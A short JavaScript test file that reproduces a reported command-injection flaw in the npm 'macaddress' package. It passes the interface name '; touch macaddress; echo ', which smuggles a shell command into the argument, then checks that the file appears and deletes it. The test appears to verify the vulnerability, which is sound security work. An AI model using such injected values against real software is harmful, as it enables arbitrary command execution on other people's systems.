//https://hackerone.com/reports/319467
test("Command Injection in macaddress", () => 
{
    const killing = require('killing');
	const fs = require('fs');
	const path = './macaddress';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	let iface = '; touch macaddress; echo ';
	require('macaddress').one(iface, function (err, mac) {
	  //console.log("Mac address for this host: %s", mac);  
	});

	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
